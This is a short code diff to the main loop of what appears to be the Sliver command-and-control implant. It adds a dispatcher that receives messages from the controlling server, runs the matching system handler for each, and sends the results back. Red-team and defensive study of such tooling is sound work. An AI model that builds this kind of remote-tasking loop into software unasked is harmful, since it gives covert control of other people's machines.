@@ -18,6 +18,7 @@ import (
 
 	pb "sliver/protobuf/sliver"
 	consts "sliver/sliver/constants"
+	"sliver/sliver/handlers"
 	"sliver/sliver/limits"
 	"sliver/sliver/transports"
 
@@ -40,13 +41,24 @@ func main() {
 	log.Printf("Hello my name is %s", consts.SliverName)
 	// {{end}}
 
-	limits.ExecLimits()
+	limits.ExecLimits() // Check to see if we should execute
+
+	sysHandlers := handlers.GetSystemHandlers()
 	for {
 		connection := transports.StartConnectionLoop()
 		if connection == nil {
 			break
 		}
-
+		for envelope := range connection.Recv {
+			if handler, ok := sysHandlers[envelope.Type]; ok {
+				go handler(envelope.Data, func(data []byte, err error) {
+					connection.Send <- &pb.Envelope{
+						ID:   envelope.ID,
+						Data: data,
+					}
+				})
+			}
+		}
 	}
 }
 
